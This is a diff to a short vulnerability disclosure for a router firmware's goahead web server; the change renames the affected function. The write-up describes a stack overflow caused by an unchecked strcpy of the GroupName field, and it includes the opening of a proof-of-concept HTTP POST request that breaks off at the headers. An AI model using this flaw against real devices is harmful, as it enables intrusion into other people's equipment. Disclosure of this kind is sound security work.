@@ -1,21 +1,21 @@
 # FUN_00416f28 漏洞信息
 
 ## 基础信息
-- **影响组件**: /gohead/FUN_00416f28
+- **影响组件**: /gohead/sub_416f28
 - **固件版本**: nv518GPV3v3.2.7-210919-162004
 
 ## 漏洞详情
 
 ![image](image.png)
 
-gohead/FUN_00416f28
+gohead/sub_416f28
 
 When executing strcpy(InstPointByIndex + 180, v15);, the buffer size is not checked. The user-modified GroupName value is passed to this location, and an overly large value will cause a stack overflow.
 
 poc：
 
 ```
-POST gohead/FUN_00416f28 HTTP/1.1
+POST gohead/sub_416f28 HTTP/1.1
 Host: 127.0.0.1
 sec-ch-ua: "Not=A?Brand";v="24", "Chromium";v="140"
 sec-ch-ua-mobile: ?0
